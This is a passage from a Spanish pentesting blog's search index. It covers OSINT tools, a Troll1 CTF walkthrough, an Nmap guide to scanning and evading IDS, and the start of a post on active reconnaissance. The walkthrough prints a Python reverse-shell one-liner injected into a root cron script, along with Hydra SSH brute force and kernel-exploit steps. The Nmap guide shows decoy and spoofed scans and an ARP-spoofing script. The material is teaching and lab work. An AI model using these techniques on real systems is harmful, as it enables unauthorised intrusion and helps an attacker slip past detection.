actuales de las webs y los recopila en un diagrama temporal.TheHarvesterhttps://github.com/laramies/theHarvestertheHarvester -htheHarvester -d domain.com -b SOURCE -l 100 -f resultstheHarvester -d domain.com -b all -l 100 -f resultsMaltegoUna de las herramientas más amplias y profesionales de recopilación de información pasiva.Instalación en Kali Linuxsudo apt install maltegoNos pedirá registrar una cuenta en su web, es gratis no hay problema así que una vez configurado todo tenemos algo como estoVamos a comenzar entendiendo un par de conceptosTransformadorTodas las consultas hacen una query a una base de datos y ejecutan unos comandos que indexan la información. Estas consultas se denominan “transforms” que se ejecutan sobre diferentes bases de datos y que podemos asociar a diferentes entidades.Empresas de terceros pueden hacer sus propios transformers para hacer querys a sus bases de datos.Creamos un nuevo grafoGrafosSe trata un lienzo en el podremos arrastrar entidades que se tratan de diferentes tipos de información sobre los que podremos buscar en fuentes públicas haciendo uso de los transformadores.Podemos ejecutar un análisis utilizando estos transformadores para recaudar datos de un nombre concreto o una entidad, incluso asociar una persona o serie de personas a una entidad y realizar una busqueda más concreta, etc.Recon-Nghttps://github.com/lanmaster53/recon-ngEs una herramienta basada en una interfaz de consola a la que se van accediendo a diferentes módulos.https://github.com/lanmaster53/recon-ng-marketplaceUsorecon-ngmodules searchmarketplace searchrun"
  },
  
  {
    "title": "Resolución de TROLL1 CTF",
    "url": "/posts/troll1/",
    "categories": "Labs & CTF, Walkthrough",
    "tags": "pentesting, ctf, privilege-escalation, linux",
    "date": "2023-08-02 00:00:00 +0200",
    





    
    "snippet": "Reconocimiento inicialDescubrimos los HOST activos:sudo nmap -sn -n 192.168.20.0/24En este caso sabemos que la maquina es la 192.168.20.128 por lo que escaneamos los puertos activos de forma segura...",
    "content": "Reconocimiento inicialDescubrimos los HOST activos:sudo nmap -sn -n 192.168.20.0/24En este caso sabemos que la maquina es la 192.168.20.128 por lo que escaneamos los puertos activos de forma segura para no ser detectados.sudo nmap -sS -n -ff --top-ports 5 192.168.20.128De nuevo aquí sabemos que esta máquina únicamente tiene los puertos 21,22 y 80 activos. Ahora vamos a ver que servicios y que versión corren esos puertos:sudo nmap -sV -n -p21,22,80 192.168.20.128Como vemos que en este caso el puerto 80 está activo significa que está corriendo alguna aplicación web así que vamos al navegador a verificar.En esta aplicación habrá archivos y contenido dentro de la aplicación web utilizando DIRBUSTER etc.Sabiendo que servicios corren podemos buscar vulnerabilidades públicas y si tienen PoC.Explotación de FTP anónimoObservamos que tiene un servicio FTP activo en el puerto 21 y que este servicio por defecto implementa un acceso anónimo, por lo que podremos probar.ftp 192.168.20.128Como vemos esta máquina tiene un login anónimo en FTP.Listamos archivos y vemos un “lol.pcap” así que lo traemos a la máquina principal:get lol.pcapexitAbrimos el archivo con WIRESHARK:Y vemos registros de inicio de sesión mediante FTPEn este tipo de conexiones es interesante ver que archivos y que transferencias se han realizado:En este caso en un FTP-DATA encontramos algo más de información.Como vemos es alguna guía para este CTF indicando que casi pero no. Podríamos intentar buscar algo sobre esta información en la aplicación web.Exploración web y enumeraciónEn el navegador vamos a buscar el directorio http://192.168.20.128/sup3rs3cr3tdirlol/Encontramos un archivo y lo descargamos.Si lo abrimos vemos que es un binario en que solo distinguimos algunas cadenas de texto.Como vemos hay algún tipo de pista.A lo mejor se está refiriendo a la aplicación web http://192.168.20.128/0x0856BF/Vemos dos carpetas en las que hay dos archivos uno con una contraseña y otro con lo que parece una lista de Usuarios:maleusps-auxfeluxEagle11genphlux &lt; -- Definitely not this oneusmc8892blawrgwytshadowvis1t0roverflowFuerza bruta SSHAhora bien, si recordamos esta máquina tiene varios servicios, FTP, HTTP y SSH, quizá esto indique algún usuario válido para poder acceder por SSH.Para ello si tenemos el usuario concreto y su contraseña pues lo hacemos manualmente si no podemos usar algunas herramientas automáticas. Una de las más famosas es HYDRA:Descargamos los archivos de texto de la máquina a la nuestra con:curl http://192.168.20.128/0x0856BF/good_luck/which_one_lol.txt &gt; users.txtcurl http://192.168.20.128/0x0856BF/this_folder_contains_the_password/Pass.txt &gt; pass.txtModificamos el documento para eliminar esa cadena de texto innecesaria y vamos con hydra:hydra -L users.txt -p \"Good_job_:)\" 192.168.20.128 sshPero parece que no es correcto ya que hydra nos devuelve que no ha encontrado coincidencias. Teniendo un poco en cuenta que es un CTF y que la carpeta donde copiamos la posible contraseña se llama “this_folder_contains_the_password”, pensando un poco y siendo creativos podemos pensar que es “Pass.txt” así que vamos a probar:hydra -L users.txt -p \"Pass.txt\" 192.168.20.128 sshComo vemos en este caso ha conseguido acceso mediante una coincidencia.A todo esto hay que tener en cuenta que todo esto será monitoreado por prácticamente cualquier IDS como SNORT si se realiza así sin más o sin protección por lo que es algo a tener en cuenta ya que hydra básicamente hace un ataque de fuerza bruta.Post-explotación y escalada de privilegiosEn este punto podemos tomar tres caminos:  Descubrir que proceso nos termina la sesión por timeout  Descubrir ficheros a los que tengamos acceso desde la máquina  Buscar vulnerabilidades para la versión del sistema operativo que esté ejecutando la máquinaVamos a ver si podemos eliminar o configurar el proceso que nos termina la sesión:cd /var/logListamos y vemos un archivo cronlog que si analizamos está ejecutando un archivo llamado cleaner.pyBuscamos donde se encuentra ese archivo y vemos su contenido:Es un script en python que de forma recursiva elimina a todo el contenido de la carpeta tmp pero si vemos quien ejecuta este archivo es el usuario root y tiene un problema de seguridad y es que el archivo se puede modificar por cualquier usuario.Buscamos un script de python para activar un reverse shell desde el archivo: PayloadsAllTheThingsimport socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.20.129\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")Con un nano vamos a modificar el script de python añadiendo esa línea de ejecución y vamos escuchar por el puerto con netcat:nano /lib/log/cleaner.pynetcat -lvp 4242Y cuando el archivo se ejecute veremos como obtenemos una reverse shell de la máquina con privilegios root:De nuevo esto es una máquina preparada por lo que en el mundo real no se encuentran esos script diseñados para poder explotarlos.Método alternativo: Kernel ExploitPero sí que en un caso real podemos hacer un análisis sobre vulnerabilidades que tenga algún servicio desactualizado que proporcione una brecha de seguridad que podamos explotar.Por ejemplo hay un exploit del kernel de linux en su versión 3.13.0 en las versiones de Ubuntu 12.04/14.04/14.10/15.04 https://www.exploit-db.com/exploits/37292Para probarlo podemos copiar el exploit e ir a una dirección donde el usuario de ssh pueda escribir como es TMP:pico exploit.c# Pegamos el exploitgcc exploit.c -o hacked./hackedY como vemos tenemos escalado de privilegios"
  },
  
  {
    "title": "NMAP - Escaneo de redes",
    "url": "/posts/nmap/",
    "categories": "Reconocimiento, Nmap",
    "tags": "nmap, network, scanning, reconnaissance",
    "date": "2023-07-06 02:00:00 +0200",
    





    
    "snippet": "sudo nmap -sS -n 192.168.20.0/24n → No hacer resolución DNS reversa, se utiliza para desactivar la resolución de DNS durante el escaneo. No realizará la resolución de nombres de dominio para las di...",
    "content": "sudo nmap -sS -n 192.168.20.0/24n → No hacer resolución DNS reversa, se utiliza para desactivar la resolución de DNS durante el escaneo. No realizará la resolución de nombres de dominio para las direcciones IP de los objetivos y mostrará las direcciones IP directamente en los resultados del escaneo en lugar de los nombres de host.0/24 → Rango de ipSi se realiza de esta forma se puede ser visto por los sistemas de detección como SNORT u otros IDS-sn (No port scan) En este caso solo detecta los host de la subred pero no activará detección en SNORT, ya que el tráfico generado es unicamente ARP (esta dirección IP a que dirección MAC corresponde)No es muy confiable ya que es muy fácil de spoofear el protocolo ARP-PS &lt;port list&gt; (TCP SYN Ping) Paquete TCP vacío y lo manda al puerto 80 para verificar la actividadsudo nmap -PS -n -sn 192.168.20.0/24Escanea los host activos pero no se puede spoofear porque verifica con un paquete TCP vacío al puerto 80 y si no responde no está activo.Aunque el puerto esté cerrado el host responde con un reset por lo que la maquina sigue estando activa-PU &lt;port list&gt; (UDP Ping) sudo nmap -PU -n -sn 192.168.20.0/24Comandos de escaneo de puertos:-sS (TCP SYN scan) -sU (UDP scans) -sA (TCP ACK scan) Solo son algunos ejemplos, para mas:https://nmap.org/book/man-port-scanning-techniques.htmlEjemplo de manipulación de escaneoScript para spoofear una mac address con python y engañar a un escaneo sin verificación de actividad en algún puerto de la maquina objetvofrom scapy.all import *def handle_packet(packet):    if packet[ARP].op == 1:        if packet.pdst == \"192.168.20.152\":            print(\"Sending ARP response\")            reply = ARP(op=2,                        hwsrc=\"00:0C:29:3D:1D:6F\",                        psrc=\"192.168.20.152\",                        hwdst=\"00:50:56:C0:00:03\",                        pdst=\"192.168.20.255\")            pkt = Ether(dst=\"00:50:56:C0:00:03\", src=\"00:0C:29:3D:1D:6F\") / reply            sendp(pkt)                        sniff(filter=\"arp\", prn=handle_packet)Ejemplo de uso realEscaneo de nodos/hostssudo nmap -PS -n -sn 192.168.20.0/24Con los nodos de la red o host ahora identificar los puertos que tienen abiertos en la red sin ser detectados por SNORTY si ahora realizásemos un escaneo de puertos con cualquiera de las técnicas proporcionadas por nmap como -sS/-sU/-sA….inmediatamente seríamos detectados por SNORT y si estuviera configurado como tal nos habría podido sacar rápidamente de la subred para aislarnos y así evitar intrusiones.Para poder evitar tanto trafico a la hora de escanear los puertos podemos usar técnicas de especificación de paquetes.Analiza los  puertos con la mayor proporción encontrados en el archivo nmap-services después de excluir todos los puertos especificados por --exclude-ports.  debe ser 1 o superior--top-ports 5sudo nmap -sS -n --top-ports 5 192.168.20.128Con este escaneo es menos probable ser detectados porque se genera mucho menos ruidoComo se puede ver en este escaneo de wireshark el tráfico generado es mucho menor que un escaneo completo y SNORT u otros IDS no lo detectarán como actividad sospechosa. Es muy importante controlar el numero de puertos en números bajos ya que a mayor numero el tráfico puede ser suficiente como para alertar al IDS, mejor no ser avariciosos y tener paciencia.-p10,11,15,32 Saber que puedes escanear puertos manualmente con en anterior comando especificando de forma manual.Vamos a utilizar otras técnicas para modificar los paquetes y así evadir otras posibles medidas de seguridad.Fragmentación de paqueteshttps://nmap.org/book/man-bypass-firewalls-ids.html-f (fragment packets); --mtu (using the specified MTU) Coge los paquetes que utilizará para el escaneo y los divide en fragmentos más pequeños o IP packets.La idea es dividir la cabecera del paquete TCP de 20bytes, en bloques menores y enviarlos.Su objetivo es principalmente evitar FIREWALLS herramientas que analizan la cabecera del paquete y la rechazan en función de ciertos parámetros.Actualmente esta medida es muy popular pero funciona pocas veces ya que es muy fácil ser detectada.Esta es la diferencia de realizar un escaneo con o sin fragmentación respectivamentenmap -sS -n -p10 Como se observa genera el tráfico TCP con SYN ACK en un paquete completo, pero si un firewall estuviese bloqueando la conexiones de protocolo TCP podemosnmap -sS -n -p10 -fSin embargo si observamos SNORT vemos un aviso peculiarDetecta que se han enviado pequeños fragmentos de paquetes IP que luego se deben re-ensamblar en la maquina objetivo y esto provoca el aviso debido a que esta es una de las formás mas comunes de hacer ataques DDoS o denegación de servicio ya que se satura al servidor con pequeños paquetes de forma masiva que debe reformar en paquetes TCP y devolver, provocando ralentización o colapso de los servicios.Lo que podemos hacer es fragmentar aun más los paquetes de 8 a 16 bytes añadiendo un f más al comando anteriornmap -sS -n -p10 -ffDe esta forma SNORT no detecta los paquetes y vemos como en vez de 3 paquetes fragmentados solo hay dos ya que una cabecera de 20 bytes dividida en paquetes de 16 son 2 y dividida en paquetes de 8 son 3.nmap -sS -n -mtu &lt;8bytes o multiplos de 8&gt;Con el anterior comando podemos especificar el número de bytes en el que fragmentar los paquetes. Esta técnica es útil para evadir ciertas medidas de seguridad como firewalls pero hay que tener en cuenta no masificar el tráfico por muy fragmentado que esté, si no los IDS detectarán rápido un escaneo de puertos.Decoy scan o escaneo de señuelo-D &lt;decoy1&gt;[,&lt;decoy2&gt;][,ME][,...] (Cloak a scan with decoys) Provoca un “spoofing” en la dirección IP  de origen que realiza el escaneo (máquina atacante), con el objetivo de que cuando tengamos un HOST dentro de la red al que queramos escanear, las máquinas de IDS o defensa de la red no detecten que el escaneo se está llevando a cabo desde nuestra maquina, utilizamos NMAP para modificar la IP de origen de los paquetes que lancemos para el escaneo.De esta manera si tenemos un IDS, este detectará que hay varias máquinas dentro de su subred que intentan escanear el objetivo y no sabrá identificar correctamente cual es la máquina atacante.nmap -sS -n -D 192.168.20.1,192.169.20.254,ME 192.168.20.128Con esta opción le indicamos una serie de direcciones IP que use como señuelo, aunque si queremos que sea realista debemos usar las mismas que se obtienen con el escaneo de NODOS o HOST realizados previamente y que se encuentran activas dentro de la subred.En este caso usamos algunas básicas y ME para que indicar que añada nuestra IP al “spoofing”.Como se observa en SNORT detecta el escaneo de puertos desde varias IP, siendo las mismas que le hemos indicado previamenteEsto es más un método preventivo para el posible análisis posterior del ataque. Una cosa a tener en cuenta es que si indicamos dentro de las IP señuelo la misma IP que la maquina objetivo obtendremos un gran número de alertas en SNORT ya que es raro que una IP se escanee a si misma.Parámetro -SPermite que manipulemos la dirección IP de origen desde la que se realiza el escaneo desde NMAP. Es muy parecido al método anterior pero no usamos señuelos, simplemente modificamos la IP desde la que se generan los paquetes de escaneo.nmap -n -S 192.168.20.1 192.168.20.128Igual que antes lo recomendable es usar maquinas que estén activas dentro de la subred en la que estemos ya que así parecerá una petición normal de servicios o un simple error de algún servicio en segundo plano, etcEn la ejecución de esta técnica tenemos que especificar la interfaz desde la que se enviarán los paquetes y ademas usar el parámetro -Pn que,  se utiliza para indicar a la herramienta que no realice el descubrimiento de hosts (ping host) antes de escanear los puertos. Básicamente, desactiva la función de detección de hosts y asume que los objetivos especificados están activos.El motivo por el cual nos pida la interfaz de escaneo es porque cuando dos nodos o HOST dentro de una misma subred se intentan comunicar lo hacen mediante su dirección física o MAC ya que la dirección IP se utiliza para la comunicación entre NODOS de diferentes redes y por eso existe el protocolo ARP. Y es debido a esto que a la hora de realizar el port scan con NMAP indicando la IP, este primero realiza un ARP request para preguntar cuál es la dirección física de la IP para poder enviar los paquetes.De esta forma con esta técnica buscamos modificar la IP de origen pero no la dirección MAC ya que si lo hiciésemos mandaríamos la información pero no podríamos tenerla de vuelta ya que la MAC no se corresponde.nmap -n -Pn -S 192.168.20.1 -e eth0 192.168.20.128En la versión de NMAP 7.94 o 7.92 no es posible así que nos iremos a una inferior.http://ftp.de.debian.org/debian/pool/main/n/nmap/nmap_7.91+dfsg1+really7.80+dfsg1-2_amd64.debSi es necesario debido a un error de libreria lua-lpeg o similares descargar e instalar igualmentehttps://packages.debian.org/bookworm/lua-lpeghttps://packages.debian.org/bullseye/libssl1.1Hecho el escaneo vemos como en SNORT indica que el escaneo hacia 192.168.20.198 es proveniente de la dirección 192.168.20.1 que es la manipulada ya que la real es 192.168.20.129Si vemos en WireShark también indica que la IP que se quiere comunicar con la objetivo es la 192.168.20.1 y no la real.Esta técnica también es muy útil cuando hay configurado un firewall que solo permite o limita la conexión de acceso por dirección IP de origen, por lo que manipulando nuestra IP de esta forma podremos saltarnos esa barrera de acceso.Además a veces el firewall puede estar configurado para que además de una dirección IP concreta también sea mediante un puerto concreto por lo que tendremos que especificar el puerto desde el que realizar el escaneo.nmap -n -Pn -S 192.168.20.1 --source-port 80 -p21 -e eth0 192.168.20.128Como vemos el escaneo indica que se realiza desde el puerto 80 al 21Control de tiempos en un escaneoUna de las técnicas por excelencia en un escaneo para evadir herramientas de seguridad como IDS o IPS.Esto es importante porque estas soluciones de seguridad implementan reglas que se basan en la combinación de diferentes reglas como por ejemplo:Si se detecta más de X numero de paquetes TCP que van dirigidos a diferentes puertos es posible que sea un escaneo. Además se suele combinar con otra regla que indica que si además si este envío de paquetes se realiza en menos de X tiempo es más probable que sea una alerta de escano.https://nmap.org/book/man-performance.htmlIndicando mediante numero INT cuantos segundos debe esperar entre cada paquete.-T paranoid|sneaky|polite|normal|aggressive|insane (Set a timing template)paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), and insane (5)--scan-delay &lt;time&gt;; --max-scan-delay &lt;time&gt; (Adjust delay between probes) Hoy en dia aunque realicemos el escaneo con -T 0 que sería el mas tardado SNORT u otros IDS lo detectará. Para optimizar esto haremos un pequeño BASH scriptfor i in {0..30..2}; do; sudo nmap -sS -p$(($i+1))-$((i+2)) -n 192.168.20.128; sleep 40; done; Lo que va a realizar es un recorrido de 0 a 30 de 2 en 2 puertos lanzando NMAP para esos dos puertos concretos, espera 30 segundos y continua.Aunque esperemos, si aumentamos el numero de puertos que escanea es más probable que nos detecte.Utilizar protocolo IPV6Las direcciones IP tienen un número finito de nodos que pueden referenciar definido por 32bytes, lo que hace que con tanta cantidad de dispositivos ya no se pueda referenciar a todos con una dirección IP por lo que surgió IPV6 y al igual que IPV4 referencias los HOST de la subred pero con más bytes.Esto importante porque actualmente IPV6 es muy soportado para la intercomunicación pero las reglas en los sistemas de seguridad como IDS no están tan orientadas a tráfico IPV6 por lo que puede ser una puerta de entrada para evadir esta seguridad.Para poder referenciar el objetivo con su IPV6 usaremos el concepto DIRECCIONES MULTICAST, (dirección de multi difusión) es una dirección IP especial que se utiliza para enviar datos desde un único emisor a varios receptores en una red. A diferencia de las direcciones unicast (para una sola interfaz de red) y las direcciones de difusión (para todas las interfaces en una red), las direcciones multicast se utilizan para comunicarse con un grupo específico de hosts en la red.De manera lógica se referencia un número de nodos en una red con el objetivo de poder enviar información sin necesidad de establecer comunicaciones individuales con cada uno de ellos.Las direcciones multicast se encuentran dentro del rango reservado de direcciones IP asignado para este propósito. El rango IPv4 asignado para direcciones multicast es 224.0.0.0 a 239.255.255.255.En IPv6, las direcciones multicast se representan con el prefijo ff00::/8. Estas direcciones son esenciales para funciones como la autoconfiguración sin estado, la transmisión de mensajes de enrutamiento y otros servicios específicos de IPv6.Entonces para descubrir los nodos o vecinos de la subred con IPV6 vamos a utilizar PING6 que enviará paquetes ICMP a todos los nodos de la red.ping6 ff02::1 ip neighPara ver los “vecinos” que nos han respondidosudo nmap -sS -n -6 fe80::20c:29ff:fe21:7bf1 -e eth0Esto puede no detectar algunos puertos con servicios que no soporten comunicación IPV6 pero también evitará que firewalls sin configuración para IPV6 tampoco nos detecten, aunque en este caso SNORT si que detecta el escaneo de puertos.Escaneo de serviciosUna vez sabemos que máquinas están levantadas y que puertos están abiertos nos interesa saber que servicios están ejecutándose en ellos y que versiones tienen.sudo nmap -sV Para no tener que realizar un escaneo de servicios a todos los puertos sino que con la previa información obtenida lo direccionamos directamente a los puertos de interés.sudo nmap -sV -n -p21,22,80 192.168.20.128Al ser tan dirigido no saltaran alarmas en el IDS.Es muy importante tener en conocimiento los puertos y los host activos para evitar rudio innecesario a la hora de reconocer servicios o aplicaciones activas en una maquina.De igual forma para identificar el sistema operativo de la maquinasudo nmap -O -n 192.168.20.128Y por defecto NMAP realizará un escaneo de puertos de forma automática para recabar información sobre los mismos y así obtener que sistema los ejecuta, por lo que hará ruido innecesario y activara los IDS.sudo nmap -O -n -p21,22,80 192.168.20.128Aun así es arriesgado y es posible ser detectados pero añadiendo todas las técnicas anteriores para combinar reduciremos el ruido y las posibilidades de ser detectados.Scripts en NMAPhttps://securitytrails.com/blog/nmap-vulnerability-scansudo nmap --script \"vuln\" -p80 192.168.20.xxVulnscangit clone https://github.com/scipag/vulscan scipag_vulscanln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscannmap -sV --script=vulscan/vulscan.nse www.example.comVulnerscd /usr/share/nmap/scripts/git clone https://github.com/vulnersCom/nmap-vulners.gitnmap --script nmap-vulners/ -sV 11.22.33.44Escaneo de hostshttps://nmap.org/book/man-host-discovery.html-sL (List scan)Podríamos hacer una resolución DNS reversa para tratar de obtener el nombre de dominio a partir de una dirección IP-sn (No port scan)Esta opción le dice a NMAP que no realice un análisis de puertos después de realizar el host Discovery y que solamente nos saque por pantalla aquellos host que se encuentran disponibles.Esta primera opción sirve para identificar hosts que se encuentran conectados a una red, y nosotros debemos estar también conectados en esa misma red para poder hacer ese descubrimiento.Para escanear la subred donde se encuentran nuestras máquinas.nmap -sn 192.268.20.0/24Cuando nosotros ejecutamos este comando con privilegios de administración, el funcionamiento de NMAP es diferente.Nosotros lo hemos ejecutado sin privilegios de administración y lo que ha hecho ha sido establecer o tratar de establecer una conexión TCP con una máquina de destino.La máquina podría estar levantada, pero no tener servicios corriendo en el puerto 80 en el puerto 4 4:3 y esto quizá podría provocar que pareciese que esta máquina no está funcionando.Si lo ejecutamos como administrador no utiliza el protocolo TCP sino que recurre también al protocolo ARP, que es el que se encarga de asociar la dirección MAC de un dispositivo su dirección IP.Esta técnica con el protocolo ARP es menos intrusiva que mandar peticiones TCP a las máquinas de la subred.A tener en cuenta también que al realizarlo con privilegios de administrador podemos obtener hosts que si están levantados pero no responden a las peticiones TCP.Tenemos otro tipo de técnicas que podríamos aplicar.-PS (TCP SYN Ping)Esta de aquí que es una de las más populares, probablemente que trata de mandar un paquete TCP SYN vacío.No solamente nos está diciendo que este host está levantado, sino que además nos dice de los puertos que tiene ese host cuáles están abiertos.Hay que tener en cuenta que primero comprueba que el host esta activo, pero después  como podemos observar, comienza a hacer un análisis de puertos.Es mucho más intrusivo porque genera mucho tráfico de red.Se puede especificar un puerto concreto:nmap -PS 192.168.20.128 -p 80Y se puede modificar el al que hace la petición para comprobar si está activo:nmap -PS21 192.168.20.128 -p 80nmap -PS21,22,23 192.168.20.128 -p 80Escaneo de puertos¿Qué es un puerto?Cuando nosotros tenemos dos computadores, dos ordenadores que quieren intercambiar información entre ellos.Entonces nosotros podemos conectarlos formando una red.Estos ordenadores pasarían a llamarse nodos de esa red y podemos intercambiar información que a priori serán una serie de cadenas de bits y que cuando llegan al sistema operativo del nodo de destino se interpretan en base a una serie de reglas estáticas que se denomina protocolo de red.Para tratar de distinguir las conexiones que establecemos para intercambiar información con otro nodo en función de las aplicaciones que estamos utilizando, se inventó el concepto de puerto.Un puerto es un numero que va a identificar una aplicación que está corriendo en el equipo y por lo tanto, si yo quiero mandar información que va dirigida a esa aplicación y que va a tener que interpretarla con un protocolo determinado, lo que hago es que le añado a mi paquete de red ese numerito que es el puerto.De manera que cuando el nodo de destino recibe la información, la parsea y la analiza ve el puerto al que va dirigido y sabe a qué aplicación concretamente va a ir dirigida y por lo tanto, qué protocolo y qué reglas estáticas aplicar para interpretar esa información.https://nmap.org/book/man-port-scanning-techniques.htmlEstados en los que pueden encontrarse los puertosopenUna aplicación está aceptando activamente conexiones TCP, data-gramas UDP o asociaciones SCTP en este puerto. Encontrar estos puertos suele ser el objetivo principal de la exploración de puertos. Las personas preocupadas por la seguridad saben que cada puerto abierto es una vía de ataque. Los atacantes y los evaluadores de penetración desean explotar los puertos abiertos, mientras que los administradores intentan cerrarlos o protegerlos con firewalls sin obstaculizar a los usuarios legítimos. Los puertos abiertos también son interesantes para exploraciones no relacionadas con la seguridad porque muestran servicios disponibles para su uso en la red.closedUn puerto cerrado es accesible (recibe y responde a paquetes de sonda de Nmap), pero no hay ninguna aplicación escuchando en él. Pueden ser útiles para mostrar que un host está activo en una dirección IP (detección de host o exploración de ping), y como parte de la detección de sistemas operativos. Debido a que los puertos cerrados son alcanzables, puede valer la pena escanear más tarde en caso de que algunos se abran. Los administradores pueden querer considerar bloquear dichos puertos con un firewall. Entonces aparecerían en el estado filtrado, que se discute a continuación.filteredNmap no puede determinar si el puerto está abierto porque el filtrado de paquetes impide que sus sondas lleguen al puerto. El filtrado podría provenir de un dispositivo de firewall dedicado, reglas de enrutador o software de firewall basado en el host. Estos puertos frustran a los atacantes porque proporcionan muy poca información. A veces responden con mensajes de error ICMP como el tipo 3 código 13 (destino inaccesible: comunicación administrativamente prohibida), pero los filtros que simplemente descartan las sondas sin responder son mucho más comunes. Esto obliga a Nmap a volver a intentarlo varias veces solo por si acaso la sonda fue descartada debido a la congestión de la red en lugar de ser filtrada. Esto ralentiza considerablemente el escaneo.unfilteredEl estado no filtrado significa que un puerto es accesible, pero Nmap no puede determinar si está abierto o cerrado. Solo el escaneo ACK, que se utiliza para mapear conjuntos de reglas de firewall, clasifica los puertos en este estado. Escanear puertos no filtrados con otros tipos de escaneo como escaneo de ventana, escaneo SYN o escaneo FIN, puede ayudar a determinar si el puerto está abierto.            **open      filtered**      Nmap coloca los puertos en este estado cuando no puede determinar si un puerto está abierto o filtrado. Esto ocurre para tipos de escaneo en los que los puertos abiertos no dan respuesta. La falta de respuesta también podría significar que un filtro de paquetes descartó la sonda o cualquier respuesta que generara. Por lo tanto, Nmap no sabe con certeza si el puerto está abierto o siendo filtrado. Los escaneos UDP, de protocolo IP, FIN, NULL y Xmas clasifican los puertos de esta manera.            **closed      filtered**      Este estado se utiliza cuando Nmap no puede determinar si un puerto está cerrado o filtrado. Solo se utiliza para el escaneo de inactividad de ID de IP.Comandos-sS (TCP SYN scan)sudo nmap -sS 192.168.20.128 | 192.168.20.0/24 | 192.168.20.120-130Este escaneo lo que va a hacer es realizar un escaneo o un análisis de los puertos que tiene ese sistema, haciendo peticiones a cada uno de los puertos del sistema de manera individual.Lo hace mediante una conexión TCP, pero al contrario de lo que habíamos visto en situaciones anteriores en las que se establecía toda la conexión completa lo que hace es dejar el handshake a medias.-v –reasonPara obtener más información sobre el escaneo y los motivos por los que el puerto está abierto:-v --reasonExportar los resultados con plantilla:-oX --stylesheet=\"https://svn.nmap.org/nmap/docs/nmap.xls\"sudo nmap -sS -v --reason -oX --stylesheet=\"https://svn.nmap.org/nmap/docs/nmap.xls\" 192.168.20.128 -sT (TCP connect scan)nmap -sT 192.168.20.128Para saber si el host esta app sí que hace el mismo descubrimiento mediante a ARP pero esta vez si completa el three way handshake.-sU (UDP scans)sudo nmap -sU 192.168.20.128Cuando nosotros ejecutamos esta petición, lo que hacen NMAP es que manda un paquete UDP que no tiene ni siquiera contenido a ese puerto para ver si hay algo ahí corriendo.Asegurar qué servicio se está ejecutando en esos puertoshttps://nmap.org/book/man-version-detection.html-sV (Version detection)sudo nmap -sV 192.168.20.128Realiza el escaneo activo al igual que antes pero determina tambíen la versión del servicio que está ofreciendo ese puerto.Al igual que con -sS no termina el three way handshake.Identificación de sistema operativoCuando nosotros queremos explotar una vulnerabilidad en un sistema determinado, con el objetivo de obtener acceso a ese sistema, de elevar privilegios o cualquier otra acción.Una de las cosas más importantes es conocer el sistema operativo que tiene instalado ese equipo.https://nmap.org/book/man-os-detection.htmlComandos-O (Enable OS detection)sudo nmap -v -O 192.168.20.128SMB enumerationProtocolo SMBEs un protocolo de red que se lleva utilizando durante muchos años en sistemas operativos Windows con el objetivo de compartir cosas como por ejemplo ficheros, carpetas compartidas, impresoras y cosas de este estilo a diferentes equipos, diferentes nodos que se encuentran en una red.Ya nace como un protocolo que tiene un montón de problemas de seguridad.SMB1, que lo implementan, pues algunos sistemas como por ejemplo Windows 2000 o Windows XP Windows 2003.A lo largo del tiempo sale la segunda versión SMB 2 que comienza a implementarse con Windows Vista, luego SMB 2.1 que lo implementa Windows 7, SMB3 con Windows 8Con el paso del tiempo han seguido surgiendo determinados problemas con este protocolo y además nosotros podemos utilizar este protocolo para tratar de hacer un descubrimiento de alguna manera de estos recursos compartidos que está ofreciendo una máquina determinada.Comandossudo nmap -v -sS -p 139,445 192.168.20.129Podemos usar script para recopilar recursos que se estén compartiendo mediante este protocolo.sudo nmap -v -sS -p 139,445 --script=smb-os-discovery 192.168.20.129Analiza, entre otras cosas, esos paquetes que se intercambian y en función de esa información sabe si pertenece en este caso a un sistema operativo u otro.sudo nmap -v -sS -p 139,445 --script=smb-enum-shares 192.168.20.129SNMP enumerationProtocolo SNMPEs un protocolo de red que nos sirve fundamentalmente para gestionar, ya sea obtener datos, cambiar algunos aspectos de la configuración del comportamiento de dispositivos de red, como puede ser por ejemplo, un router, un switch pero, también de servidores.Es un protocolo que en la mayoría de las ocasiones está mal configurado en muchos servidores y permite la obtención de mucha información.Este protocolo se ejecuta en el puerto 161 y funciona por UDPsudo nmap -v -sU -p 161 192.168.20.129Mediante los scriptssudo nmap -v -sU -p 161 --script=snmp-win32-software 192.168.20.129sudo nmap -v -sU -p 161 --script=snmp-win32-users 192.168.20.129sudo nmap -v -sU -p 161 --script=snmp-processes 192.168.20.129sudo nmap -v -sU -p 161 --script=snmp-netstat 192.168.20.129"
  },
  
  {
    "title": "Recopilación Activa",
    "url": "/posts/reconocimiento_activo/",
    "categories": "Reconocimiento, Recopilación, Activa",
    "tags": "recon, dns, subdominios, tecnologias, content-discovery",
    "date": "2023-07-06 00:00:00 +0200",
    





    
    "snippet": "Recopilación activa de informaciónRecolección de información sobre un objetivo determinado utilizando métodos que interactúan de manera directa con la organización, normalmente mediante el envío de...",
    "content": "Recopilación activa de informaciónRecolección de información sobre un objetivo determinado utilizando métodos que interactúan de manera directa con la organización, normalmente mediante el envío de tráfico de red.  Escaneo de hosts  Escaneo de puertos  Escaneo de serviciosEn muchas ocasiones la actividad de este tipo de técnicas suele ser detectada como actividad sospechosa o maliciosa.Esto es importante tenerlo en cuenta porque si nosotros estamos realizando un ejercicio de hacking ético a una organización y no podemos ser identificados o detectados por esas herramientas de detección, pues porque estamos también verificando esa capacidad de detección, entonces tendremos que tener cuidado con qué técnicas de recopilación activa estamos utilizando y centrarnos únicamente en aquellas que sean menos intrusivas.DNSrecoon y transferencia de zonaAnteriormente veíamos como consultar datos de forma pasiva sobre diferentes dominios.Estas consultas se realizaban en medida al fichero de zona de estos DNS servers pero no eran el fichero como tal.Vamos ver como poder descargar ese fichero de zona en un DNS server mal configurado.Transferencia de zonaEs una capacidad que nos proporcionan los DNS server para copiar ese fichero de zona a otro DNS server y no tener que volver a crearlo.Esto a veces está mal configurado y nos permite realizar esta transferencia de zona a un DNS server no autorizado.Vamos a utilizar un dominio de pruebas para ver ese fichero de zonas. https://dnsdumpster.com/Buscamos “zonetransfer.me”Vemos alguna información pero vamos a ver como con el fichero tendremos mucha más información.Existen algunas herramientas de terminal que permiten sacar información como DNS dumpster.sudo apt install 